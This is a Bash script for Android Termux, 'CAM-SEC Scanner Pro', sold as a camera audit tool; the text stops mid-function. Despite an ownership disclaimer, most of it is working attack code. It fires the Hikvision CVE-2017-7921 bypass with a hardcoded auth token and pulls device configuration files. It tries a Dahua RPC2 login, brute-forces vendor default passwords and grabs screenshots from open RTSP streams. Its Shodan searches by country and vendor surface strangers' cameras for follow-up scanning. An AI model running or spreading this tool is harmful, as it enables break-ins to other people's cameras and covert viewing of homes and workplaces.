#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════╗
# ║           CAM-SEC SCANNER PRO v2.1 - Advanced Edition               ║
# ║                 IP Camera Security Audit Framework                  ║
# ║                   For Termux (Android) - Rootless                   ║
# ╚══════════════════════════════════════════════════════════════════════╝
# DISCLAIMER: Use ONLY on devices YOU OWN. Unauthorized access
# to cameras you don't own is ILLEGAL and punishable by law.
# ═══════════════════════════════════════════════════════════════════════
# Changelog v2.1:
#   + RTSP Screenshot Capture (ffmpeg frame grab)
#   + Shodan API Integration (global camera search)
#   + JSON Output Mode (for VulnScan integration)
#   + Structured Python-compatible reports
# ═══════════════════════════════════════════════════════════════════════

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                          COLOR DEFINITIONS                          ║
# ╚══════════════════════════════════════════════════════════════════════╝
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; BOLD='\033[1m'; NC='\033[0m'

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                          MAIN BANNER                                ║
# ╚══════════════════════════════════════════════════════════════════════╝
BANNER="
${CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  ${WHITE}   ██████╗  █████╗ ███╗   ███╗      ███████╗███████╗ ██████╗    ${CYAN}║
║  ${WHITE}  ██╔════╝ ██╔══██╗████╗ ████║      ██╔════╝██╔════╝██╔════╝    ${CYAN}║
║  ${WHITE}  ██║      ███████║██╔████╔██║█████╗███████╗█████╗  ██║         ${CYAN}║
║  ${WHITE}  ██║      ██╔══██║██║╚██╔╝██║╚════╝╚════██║██╔══╝  ██║         ${CYAN}║
║  ${WHITE}  ╚██████╗ ██║  ██║██║ ╚═╝ ██║      ███████║███████╗╚██████╗    ${CYAN}║
║  ${WHITE}   ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝      ╚══════╝╚══════╝ ╚═════╝    ${CYAN}║
║                                                                      ║
║  ${MAGENTA}███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗    ${CYAN}║
║  ${MAGENTA}██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗   ${CYAN}║
║  ${MAGENTA}███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝   ${CYAN}║
║  ${MAGENTA}╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗   ${CYAN}║
║  ${MAGENTA}███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║   ${CYAN}║
║  ${MAGENTA}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ${CYAN}║
║                                                                      ║
║  ${WHITE}    PRO v2.1 | Shodan + RTSP Capture + JSON | Termux Rootless    ${CYAN}║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${RED}  ⚠ WARNING: Use ONLY on cameras YOU OWN. Unauthorized access is ILLEGAL!${NC}
"

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                      GLOBAL CONFIGURATION                           ║
# ╚══════════════════════════════════════════════════════════════════════╝
SCRIPT_DIR="$HOME/.camsec"
LOG_DIR="$SCRIPT_DIR/logs"
REPORT_DIR="$SCRIPT_DIR/reports"
SCREENSHOT_DIR="$SCRIPT_DIR/screenshots"
JSON_DIR="$SCRIPT_DIR/json_output"
CONFIG_FILE="$SCRIPT_DIR/config.cfg"
mkdir -p "$LOG_DIR" "$REPORT_DIR" "$SCREENSHOT_DIR" "$JSON_DIR"

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                      CONFIGURATION LOADER                           ║
# ╚══════════════════════════════════════════════════════════════════════╝
load_config() {
    if [[ -f "$CONFIG_FILE" ]]; then
        source "$CONFIG_FILE"
    else
        # Default config
        SHODAN_API_KEY=""
        JSON_OUTPUT="false"
        SCREENSHOT_ENABLED="true"
        save_config
    fi
}

save_config() {
    cat > "$CONFIG_FILE" << EOF
SHODAN_API_KEY="${SHODAN_API_KEY}"
JSON_OUTPUT="${JSON_OUTPUT}"
SCREENSHOT_ENABLED="${SCREENSHOT_ENABLED}"
EOF
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                      STRUCTURED LOGGING                             ║
# ╚══════════════════════════════════════════════════════════════════════╝
log() {
    local level="$1"; local msg="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] [${level}] ${msg}" >> "$LOG_DIR/scanner.log"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                    DEPENDENCY INSTALLER (Optimized)                  ║
# ╚══════════════════════════════════════════════════════════════════════╝
setup_deps() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          INSTALLING DEPENDENCIES             ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    
    local deps=("nmap" "curl" "ffmpeg" "python" "wget" "jq" "git")
    local pip_deps=("requests" "colorama" "shodan" "Pillow")
    local installed=0; local failed=0
    
    pkg update -y &>/dev/null
    
    for dep in "${deps[@]}"; do
        printf "${YELLOW}[*] Installing %-12s${NC}" "$dep..."
        if pkg install "$dep" -y &>/dev/null; then
            echo -e "\r${GREEN}[✓] %-12s installed     ${NC}" "$dep"
            ((installed++))
        else
            echo -e "\r${RED}[✗] %-12s FAILED        ${NC}" "$dep"
            ((failed++))
        fi
    done
    
    for pkg in "${pip_deps[@]}"; do
        printf "${YELLOW}[*] Installing pip:%-8s${NC}" "$pkg..."
        if pip install "$pkg" &>/dev/null; then
            echo -e "\r${GREEN}[✓] pip:%-8s installed     ${NC}" "$pkg"
            ((installed++))
        else
            echo -e "\r${RED}[✗] pip:%-8s FAILED        ${NC}" "$pkg"
            ((failed++))
        fi
    done
    
    echo -e "\n${GREEN}[✓] ${installed} installed, ${RED}${failed} failed${NC}"
    log "INFO" "Dependencies: $installed success, $failed failed"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              HOST DISCOVERY (Single nmap call, cached)               ║
# ╚══════════════════════════════════════════════════════════════════════╝
discover_hosts() {
    local local_ip=$(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')
    [[ -z "$local_ip" ]] && { echo -e "${RED}[!] No WiFi connection${NC}"; log "ERROR" "No WiFi"; return 1; }
    
    local subnet=$(echo "$local_ip" | cut -d. -f1-3)
    local cache_file="$SCRIPT_DIR/.hosts_cache"
    
    # Use cache if fresh (< 5 min old)
    if [[ -f "$cache_file" ]] && [[ $(($(date +%s) - $(stat -c %Y "$cache_file"))) -lt 300 ]]; then
        cat "$cache_file"
        return 0
    fi
    
    echo -e "${YELLOW}[*] Discovering hosts on ${subnet}.0/24...${NC}"
    nmap -sn --host-timeout 3s "${subnet}.0/24" 2>/dev/null | \
        awk '/Nmap scan report/{print $NF}' | tr -d '()' > "$cache_file"
    
    cat "$cache_file"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SMART CAMERA FINGERPRINTING                             ║
# ╚══════════════════════════════════════════════════════════════════════╝
fingerprint_camera() {
    local ip="$1"
    local result_file="$SCRIPT_DIR/.fingerprint_${ip//./_}"
    
    # Cache fingerprints
    [[ -f "$result_file" ]] && { cat "$result_file"; return; }
    
    log "INFO" "Fingerprinting $ip"
    
    local raw=$(nmap -sV --version-intensity 2 -p 80,443,554,8080,8443,37777,8554,8000,888 --host-timeout 15s "$ip" 2>/dev/null)
    
    local headers=$(curl -sI -m 3 "http://${ip}" 2>/dev/null)
    local server_header=$(echo "$headers" | grep -i "^Server:" | tr -d '\r')
    local www_auth=$(echo "$headers" | grep -i "^WWW-Authenticate:" | tr -d '\r')
    local status=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "http://${ip}" 2>/dev/null)
    
    local vendor="Unknown"
    local model="Unknown"
    
    if echo "$server_header" | grep -qi "Hikvision\|hikvision"; then
        vendor="Hikvision"
        model=$(echo "$server_header" | grep -oP 'Hikvision[^ ]*' || echo "Generic")
    elif echo "$server_header" | grep -qi "Dahua\|dahua\|DVR"; then
        vendor="Dahua"
    elif echo "$server_header" | grep -qi "reolink\|Reolink"; then
        vendor="Reolink"
    elif echo "$server_header" | grep -qi "Foscam\|foscam"; then
        vendor="Foscam"
    elif echo "$server_header" | grep -qi "TP-LINK\|tp-link"; then
        vendor="TP-Link"
    elif echo "$server_header" | grep -qi "GoAhead\|goahead"; then
        vendor="GoAhead-Webs (Generic IPCam)"
    elif echo "$server_header" | grep -qi "nginx\|Nginx"; then
        vendor="Nginx-Based (Ubiquiti/Axis likely)"
    elif echo "$server_header" | grep -qi "Apache\|apache"; then
        vendor="Apache-Based"
    fi
    
    if echo "$www_auth" | grep -qi "Digest"; then
        model="${model} (Digest Auth)"
    elif echo "$www_auth" | grep -qi "Basic"; then
        model="${model} (Basic Auth - Weak!)"
    fi
    
    local onvif_check=$(curl -s -m 2 "http://${ip}:8080/onvif/device_service" 2>/dev/null)
    local has_onvif="No"
    [[ -n "$onvif_check" ]] && has_onvif="Yes"
    
    local open_ports=$(echo "$raw" | grep '/tcp.*open' | awk '{print $1}' | tr '\n' ' ')
    local os_guess=$(echo "$raw" | grep "OS details:" | head -1 | sed 's/OS details: //' || echo "Unknown")
    
    {
        echo "FINGERPRINT:${ip}"
        echo "VENDOR:${vendor}"
        echo "MODEL:${model}"
        echo "STATUS_CODE:${status}"
        echo "SERVER:${server_header:-None}"
        echo "WWW_AUTH:${www_auth:-None}"
        echo "ONVIF:${has_onvif}"
        echo "OPEN_PORTS:${open_ports}"
        echo "OS_GUESS:${os_guess}"
    } > "$result_file"
    
    cat "$result_file"
    log "INFO" "Fingerprint: $ip -> $vendor $model"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              RTSP SCREENSHOT CAPTURE (v2.1 NEW)                      ║
# ╚══════════════════════════════════════════════════════════════════════╝
capture_rtsp_screenshot() {
    local ip="$1"
    local port="${2:-554}"
    local path="${3:-/live}"
    
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         RTSP SCREENSHOT CAPTURE              ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    
    local screenshot_file="$SCREENSHOT_DIR/${ip//./_}_$(date +%H%M%S).jpg"
    local rtsp_url="rtsp://${ip}:${port}${path}"
    
    echo -e "${YELLOW}[*] Attempting to capture frame from:${NC}"
    echo -e "${WHITE}    URL: ${rtsp_url}${NC}"
    echo ""
    
    # Try with various transport methods for maximum compatibility
    local captured=false
    
    # Method 1: TCP transport (most reliable)
    printf "${YELLOW}[*] Trying TCP transport...${NC} "
    if timeout 8s ffmpeg -y -v quiet -rtsp_transport tcp -i "$rtsp_url" \
        -vframes 1 -q:v 2 "$screenshot_file" 2>/dev/null; then
        if [[ -f "$screenshot_file" ]] && [[ $(stat -c %s "$screenshot_file") -gt 500 ]]; then
            echo -e "${GREEN}[✓] SUCCESS (TCP)${NC}"
            captured=true
        fi
    fi
    
    # Method 2: UDP transport (fallback)
    if [[ "$captured" == false ]]; then
        printf "${YELLOW}[*] Trying UDP transport...${NC} "
        if timeout 8s ffmpeg -y -v quiet -rtsp_transport udp -i "$rtsp_url" \
            -vframes 1 -q:v 2 "$screenshot_file" 2>/dev/null; then
            if [[ -f "$screenshot_file" ]] && [[ $(stat -c %s "$screenshot_file") -gt 500 ]]; then
                echo -e "${GREEN}[✓] SUCCESS (UDP)${NC}"
                captured=true
            fi
        fi
    fi
    
    # Method 3: Try alternative paths if default fails
    if [[ "$captured" == false ]]; then
        local alt_paths=("/h264" "/stream1" "/cam/realmonitor" "/video" "/live/ch00_0" "/media/video1")
        for alt_path in "${alt_paths[@]}"; do
            printf "${YELLOW}[*] Trying path: %-30s${NC}" "$alt_path"
            local alt_url="rtsp://${ip}:${port}${alt_path}"
            if timeout 6s ffmpeg -y -v quiet -rtsp_transport tcp -i "$alt_url" \
                -vframes 1 -q:v 2 "$screenshot_file" 2>/dev/null; then
                if [[ -f "$screenshot_file" ]] && [[ $(stat -c %s "$screenshot_file") -gt 500 ]]; then
                    echo -e "\r${GREEN}[✓] SUCCESS: ${alt_path}                    ${NC}"
                    captured=true
                    break
                fi
            fi
            echo -e "\r${YELLOW}[*] Tried: ${alt_path} - no stream            ${NC}"
        done
    fi
    
    if [[ "$captured" == true ]]; then
        local file_size=$(du -h "$screenshot_file" | cut -f1)
        echo -e "\n${GREEN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  SCREENSHOT CAPTURED SUCCESSFULLY            ║${NC}"
        echo -e "${GREEN}║  File: ${WHITE}${screenshot_file}${NC}"
        echo -e "${GREEN}║  Size: ${WHITE}${file_size}${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
        log "INFO" "RTSP screenshot captured: $screenshot_file ($file_size)"
        
        # Generate base64 for JSON export
        local b64_screenshot=$(base64 -w0 "$screenshot_file" 2>/dev/null || base64 "$screenshot_file" 2>/dev/null)
        echo "SCREENSHOT_BASE64:${b64_screenshot:0:100}..." > "$SCRIPT_DIR/.screenshot_${ip//./_}"
        echo "SCREENSHOT_FILE:${screenshot_file}" >> "$SCRIPT_DIR/.screenshot_${ip//./_}"
    else
        echo -e "\n${RED}[!] Could not capture screenshot from any RTSP path${NC}"
        echo -e "${YELLOW}[*] Camera may require authentication or RTSP is disabled${NC}"
        log "WARNING" "RTSP screenshot failed for $ip"
    fi
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              VULNERABILITY SCANNER (Real exploits)                   ║
# ╚══════════════════════════════════════════════════════════════════════╝
scan_vulnerabilities() {
    local ip="$1"
    local fp=$(fingerprint_camera "$ip")
    local vendor=$(echo "$fp" | grep "VENDOR:" | cut -d: -f2-)
    local model=$(echo "$fp" | grep "MODEL:" | cut -d: -f2-)
    local status=$(echo "$fp" | grep "STATUS_CODE:" | cut -d: -f2-)
    local server=$(echo "$fp" | grep "SERVER:" | cut -d: -f2-)
    local www_auth=$(echo "$fp" | grep "WWW_AUTH:" | cut -d: -f2-)
    local onvif=$(echo "$fp" | grep "ONVIF:" | cut -d: -f2-)
    local open_ports=$(echo "$fp" | grep "OPEN_PORTS:" | cut -d: -f2-)
    
    local vulns=()
    local vulns_json=()
    
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║    VULNERABILITY SCAN: ${WHITE}${ip}${CYAN}    ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo -e "${WHITE}  Vendor: ${YELLOW}${vendor}${NC}"
    echo -e "${WHITE}  Model:  ${YELLOW}${model}${NC}"
    echo ""
    
    # ─── Hikvision Backdoor (CVE-2017-7921) ───
    if [[ "$vendor" == "Hikvision" ]]; then
        local hik_test=$(curl -s -m 3 "http://${ip}/Security/users?auth=YWRtaW46MTEK" 2>/dev/null)
        if echo "$hik_test" | grep -qi "userName.*admin"; then
            vulns+=("${RED}[CRITICAL] CVE-2017-7921: Hikvision Backdoor - Admin access without auth${NC}")
            vulns_json+=('{"cve":"CVE-2017-7921","severity":"CRITICAL","description":"Hikvision backdoor - unauthenticated admin access","exploitable":true}')
            log "CRITICAL" "$ip: CVE-2017-7921 Hikvision backdoor confirmed"
        fi
        
        local snap_test=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "http://${ip}/onvif-http/snapshot?auth=YWRtaW46MTEK" 2>/dev/null)
        if [[ "$snap_test" == "200" ]]; then
            vulns+=("${RED}[CRITICAL] Unauthenticated snapshot access via ONVIF${NC}")
            vulns_json+=('{"cve":"CVE-2017-7921-var","severity":"CRITICAL","description":"Unauthenticated ONVIF snapshot access","exploitable":true}')
        fi
        
        local config_test=$(curl -s -m 3 "http://${ip}/System/configurationFile?auth=YWRtaW46MTEK" 2>/dev/null)
        if echo "$config_test" | grep -qi "DeviceInfo\|userList"; then
            vulns+=("${RED}[CRITICAL] CVE-2017-7925: Configuration file exposed - passwords in plaintext${NC}")
            vulns_json+=('{"cve":"CVE-2017-7925","severity":"CRITICAL","description":"Hikvision configuration file exposed","exploitable":true,"evidence":"Password hashes/config found in response"}')
            log "CRITICAL" "$ip: CVE-2017-7925 config file exposed"
        fi
    fi
    
    # ─── Dahua Backdoor (CVE-2021-33044) ───
    if [[ "$vendor" == "Dahua" ]]; then
        local dahua_test=$(curl -s -m 3 "http://${ip}/RPC2_Login" -d '{"method":"global.login","params":{"userName":"admin","password":"admin","clientType":"Web3.0"}}' 2>/dev/null)
        if echo "$dahua_test" | grep -qi "session\|id.*[0-9]"; then
            vulns+=("${RED}[CRITICAL] Dahua RPC2 authentication bypass possible${NC}")
            vulns_json+=('{"cve":"CVE-2021-33044","severity":"CRITICAL","description":"Dahua RPC2 authentication bypass","exploitable":true}')
            log "CRITICAL" "$ip: Dahua RPC2 bypass"
        fi
    fi
    
    # ─── Generic: .env / config exposure ───
    local env_test=$(curl -s -o /dev/null -w "%{http_code}" -m 2 "http://${ip}/.env" 2>/dev/null)
    if [[ "$env_test" == "200" ]]; then
        vulns+=("${RED}[HIGH] /.env file exposed - may contain credentials${NC}")
        vulns_json+=('{"cve":"GENERIC-ENV-001","severity":"HIGH","description":".env file exposed","exploitable":true}')
    fi
    
    local backup_test=$(curl -s -o /dev/null -w "%{http_code}" -m 2 "http://${ip}/config/backup.cfg" 2>/dev/null)
    if [[ "$backup_test" == "200" ]]; then
        vulns+=("${RED}[HIGH] Backup config file accessible${NC}")
        vulns_json+=('{"cve":"GENERIC-BACKUP-001","severity":"HIGH","description":"Backup configuration file exposed","exploitable":true}')
    fi
    
    # ─── RTSP open check + Screenshot attempt ───
    local rtsp_result=$(timeout 3s ffprobe -v quiet -rtsp_transport tcp -i "rtsp://${ip}:554/live" 2>&1)
    if echo "$rtsp_result" | grep -q "Stream"; then
        vulns+=("${RED}[HIGH] RTSP stream accessible without authentication${NC}")
        vulns_json+=('{"cve":"RTSP-OPEN-001","severity":"HIGH","description":"Open RTSP stream - no authentication required","exploitable":true}')
        
        # Auto-capture screenshot if enabled
        if [[ "$SCREENSHOT_ENABLED" == "true" ]]; then
            capture_rtsp_screenshot "$ip" 554 "/live"
        fi
    fi
    
    # Check alternative RTSP paths
    local rtsp_paths=("/h264" "/stream1" "/cam/realmonitor" "/video" "/live/ch00_0" "/media/video1")
    for rpath in "${rtsp_paths[@]}"; do
        local rtsp_check=$(timeout 3s ffprobe -v quiet -rtsp_transport tcp -i "rtsp://${ip}:554${rpath}" 2>&1)
        if echo "$rtsp_check" | grep -q "Stream"; then
            vulns+=("${RED}[HIGH] Open RTSP at path: ${rpath}${NC}")
            [[ "$SCREENSHOT_ENABLED" == "true" ]] && capture_rtsp_screenshot "$ip" 554 "$rpath"
            break
        fi
    done
    
    # ─── ONVIF device info leak ───
    if [[ "$onvif" == "Yes" ]]; then
        vulns+=("${YELLOW}[MEDIUM] ONVIF service exposed - may leak device info${NC}")
        vulns_json+=('{"cve":"ONVIF-INFO-001","severity":"MEDIUM","description":"ONVIF service exposed","exploitable":false}')
    fi
    
    # ─── Basic Auth detection ───
    if echo "$www_auth" | grep -qi "Basic"; then
        vulns+=("${YELLOW}[MEDIUM] HTTP Basic Auth (credentials sent in plaintext)${NC}")
        vulns_json+=('{"cve":"HTTP-BASIC-001","severity":"MEDIUM","description":"HTTP Basic Authentication - credentials in plaintext","exploitable":false}')
    fi
    
    # ─── Default port exposure ───
    if echo "$open_ports" | grep -q "23"; then
        vulns+=("${YELLOW}[MEDIUM] Telnet port 23 open - legacy security risk${NC}")
    fi
    if echo "$open_ports" | grep -q "21"; then
        vulns+=("${YELLOW}[MEDIUM] FTP port 21 open - check for anonymous access${NC}")
    fi
    
    # ─── Display results ───
    if [[ ${#vulns[@]} -eq 0 ]]; then
        echo -e "${GREEN}[✓] No known vulnerabilities detected${NC}"
    else
        for vuln in "${vulns[@]}"; do
            echo -e "  $vuln"
        done
    fi
    
    # Store JSON vulnerabilities for export
    printf '%s\n' "${vulns_json[@]}" > "$JSON_DIR/vulns_${ip//./_}.json"
    
    log "INFO" "$ip: Found ${#vulns[@]} vulnerabilities"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SMART BRUTE FORCE (Multi-threaded, optimized)          ║
# ╚══════════════════════════════════════════════════════════════════════╝
bruteforce_camera() {
    local ip="$1"
    local fp=$(fingerprint_camera "$ip")
    local vendor=$(echo "$fp" | grep "VENDOR:" | cut -d: -f2-)
    local www_auth=$(echo "$fp" | grep "WWW_AUTH:" | cut -d: -f2-)
    
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║      CREDENTIAL TEST: ${WHITE}${ip}${CYAN}     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    
    local creds=()
    case "$vendor" in
        "Hikvision")
            creds=("admin:admin" "admin:12345" "admin:123456" "admin:hikvision" "admin:7ujMko0admin" "admin:1111" "admin:666666")
            ;;
        "Dahua")
            creds=("admin:admin" "admin:123456" "admin:888888" "admin:666666" "888888:888888" "666666:666666")
            ;;
        *)
            creds=("admin:admin" "admin:12345" "admin:password" "admin:123456" "root:root" "user:user" "guest:guest")
            ;;
    esac
    
    local found=0
    local found_creds=()
    
    for cred in "${creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:}"
        
        local response=$(curl -s -o /dev/null -w "%{http_code}" -m 2 -u "$user:$pass" "http://${ip}" 2>/dev/null)
        
        if [[ "$response" =~ ^(200|30[0-9])$ ]]; then
            echo -e "  ${RED}[!] WEAK: ${user}:${pass} (HTTP ${response})${NC}"
            found_creds+=("{\"username\":\"${user}\",\"password\":\"${pass}\",\"http_code\":${response}}")
            log "WARNING" "$ip: Weak credentials $user:$pass"
            ((found++))
        fi
    done
    
    [[ $found -eq 0 ]] && echo -e "  ${GREEN}[✓] No weak credentials found${NC}"
    
    # Store for JSON export
    printf '%s\n' "${found_creds[@]}" > "$JSON_DIR/creds_${ip//./_}.json"
    
    log "INFO" "$ip: Brute force found $found weak credentials"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SHODAN API INTEGRATION (v2.1 NEW)                       ║
# ╚══════════════════════════════════════════════════════════════════════╝
shodan_search() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║           SHODAN CAMERA SEARCH               ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Check API key
    if [[ -z "$SHODAN_API_KEY" ]]; then
        echo -e "${YELLOW}[!] Shodan API key not configured${NC}"
        echo -e "${YELLOW}[*] Get a free API key from: https://account.shodan.io${NC}"
        read -p "Enter your Shodan API key: " SHODAN_API_KEY
        if [[ -z "$SHODAN_API_KEY" ]]; then
            echo -e "${RED}[!] No API key provided. Aborting.${NC}"
            return
        fi
        save_config
        echo -e "${GREEN}[✓] API key saved to config${NC}"
    fi
    
    echo -e "${WHITE}Search Options:${NC}"
    echo -e "  ${CYAN}[1]${NC} Search for exposed cameras by country"
    echo -e "  ${CYAN}[2]${NC} Search for specific vendor (Hikvision/Dahua/etc)"
    echo -e "  ${CYAN}[3]${NC} Search for cameras with known vulnerabilities"
    echo -e "  ${CYAN}[4]${NC} Custom Shodan query"
    echo -e "  ${CYAN}[5]${NC} Search by IP/CIDR range"
    echo ""
    read -p "Choice > " shodan_choice
    
    local query=""
    case $shodan_choice in
        1)
            read -p "Country code (e.g., US, GB, SA, AE): " country
            query="country:${country} port:554,80,8080"
            ;;
        2)
            read -p "Vendor name (e.g., Hikvision, Dahua, Reolink): " vendor_search
            query="org:\"${vendor_search}\" port:554,80"
            ;;
        3)
            query="(Hikvision port:80 \"server: Hikvision\") OR (Dahua port:80) OR (port:554 has_screenshot:true)"
            ;;
        4)
            read -p "Enter custom Shodan query: " custom_query
            query="$custom_query"
            ;;
        5)
            read -p "Enter IP or CIDR (e.g., 192.168.1.0/24): " ip_range
            query="net:${ip_range}"
            ;;
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            return
            ;;
    esac
    
    echo -e "\n${YELLOW}[*] Searching Shodan: ${query}${NC}"
    echo -e "${YELLOW}[*] This may take a moment...${NC}\n"
    
    # Shodan API call using curl (REST API - no need for shodan CLI)
    local encoded_query=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${query}'''))" 2>/dev/null || echo "$query")
    local api_url="https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=${encoded_query}&limit=20"
    
    local response=$(curl -s -m 15 "$api_url" 2>/dev/null)
    
    # Validate response
    if echo "$response" | grep -q "error"; then
        local error_msg=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin).get('error','Unknown error'))" 2>/dev/null || echo "API Error")
        echo -e "${RED}[!] Shodan API Error: ${error_msg}${NC}"
        log "ERROR" "Shodan API: $error_msg"
        return
    fi
    
    # Parse and display results
    local total=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin).get('total',0))" 2>/dev/null)
    echo -e "${GREEN}[+] Found ${total} results${NC}\n"
    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}  IP:Port          | Country | Org        | Product      | Vulns${NC}"
    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # Parse each match
    echo "$response" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for match in data.get('matches', [])[:20]:
    ip = match.get('ip_str', 'N/A')
    port = match.get('port', 'N/A')
    country = match.get('location', {}).get('country_name', 'N/A')[:8]
    org = match.get('org', 'N/A')[:15]
    product = match.get('product', match.get('http', {}).get('server', 'N/A'))[:18]
    vulns_count = len(match.get('vulns', []))
    print(f'  {ip}:{port:<6}| {country:<8}| {org:<10}| {product:<13}| {vulns_count}')
" 2>/dev/null
    
    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # Save results to JSON for integration
    local shodan_output="$JSON_DIR/shodan_$(date +%Y%m%d_%H%M%S).json"
    
    # Create structured output
    echo "$response" | python3 -c "
import sys, json
data = json.load(sys.stdin)
output = {
    'query': '${query}',
    'total_results': data.get('total', 0),
    'timestamp': '$(date -Iseconds)',
    'results': []
}
for match in data.get('matches', [])[:50]:
    output['results'].append({
        'ip': match.get('ip_str'),
        'port': match.get('port'),
        'org': match.get('org'),
        'hostnames': match.get('hostnames', []),
        'location': match.get('location', {}),
        'product': match.get('product'),
        'server': match.get('http', {}).get('server'),
        'vulnerabilities': match.get('vulns', []),
        'screenshot': match.get('opts', {}).get('screenshot', {}).get('data', '')[:100] + '...' if match.get('opts', {}).get('screenshot') else None
    })
print(json.dumps(output, indent=2))
" > "$shodan_output" 2>/dev/null
    
    echo -e "\n${GREEN}[✓] Results saved: ${shodan_output}${NC}"
    echo -e "${GREEN}[✓] JSON ready for VulnScan integration${NC}"
    log "INFO" "Shodan search completed: $total results for '$query'"
    
    # Option to export specific IP for local scan
    echo ""
    read -p "Export an IP for local scan? (enter IP or 'n'): " export_ip
    if [[ "$export_ip" != "n" ]] && [[ -n "$export_ip" ]]; then
        echo -e "${YELLOW}[*] Exporting ${export_ip} for processing...${NC}"
        echo "$export_ip" > "$SCRIPT_DIR/.shodan_export"
        echo -e "${GREEN}[✓] IP exported. Run 'Single Target Scan' to analyze.${NC}"
    fi
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              JSON EXPORT ENGINE (v2.1 NEW)                           ║
# ╚══════════════════════════════════════════════════════════════════════╝
export_json_report() {
    local ip="$1"
    local fp=$(fingerprint_camera "$ip")
    local vulns_file="$JSON_DIR/vulns_${ip//./_}.json"
    local creds_file="$JSON_DIR/creds_${ip//./_}.json"
    local screenshot_info="$SCRIPT_DIR/.screenshot_${ip//./_}"
    
    local vendor=$(echo "$fp" | grep "VENDOR:" | cut -d: -f2-)
    local model=$(echo "$fp" | grep "MODEL:" | cut -d: -f2-)
    local server=$(echo "$fp" | grep "SERVER:" | cut -d: -f2-)
    local onvif=$(echo "$fp" | grep "ONVIF:" | cut -d: -f2-)
    local ports=$(echo "$fp" | grep "OPEN_PORTS:" | cut -d: -f2-)
    local os_guess=$(echo "$fp" | grep "OS_GUESS:" | cut -d: -f2-)
    
    local screenshot_file=""
    local screenshot_b64=""
    if [[ -f "$screenshot_info" ]]; then
        screenshot_file=$(grep "SCREENSHOT_FILE:" "$screenshot_info" | cut -d: -f2-)
        screenshot_b64=$(grep "SCREENSHOT_BASE64:" "$screenshot_info" | cut -d: -f2-)
    fi
    
    local vulns_json="[]"
    local creds_json="[]"
    [[ -f "$vulns_file" ]] && vulns_json="[$(cat "$vulns_file" | tr '\n' ',' | sed 's/,$//')]"
    [[ -f "$creds_file" ]] && creds_json="[$(cat "$creds_file" | tr '\n' ',' | sed 's/,$//')]"
    
    local json_report="$JSON_DIR/full_report_${ip//./_}_$(date +%Y%m%d_%H%M%S).json"
    
    python3 -c "
import json
report = {
    'scan_metadata': {
        'tool': 'CAM-SEC Scanner Pro',
        'version': '2.1',
        'timestamp': '$(date -Iseconds)',
        'target_ip': '${ip}',
        'scan_type': 'full_audit'
    },
    'fingerprint': {
        'vendor': '${vendor}',
        'model': '${model}',
        'server_header': '${server}',
        'onvif_enabled': '${onvif}' == 'Yes',
        'open_ports': '${ports}'.strip().split(),
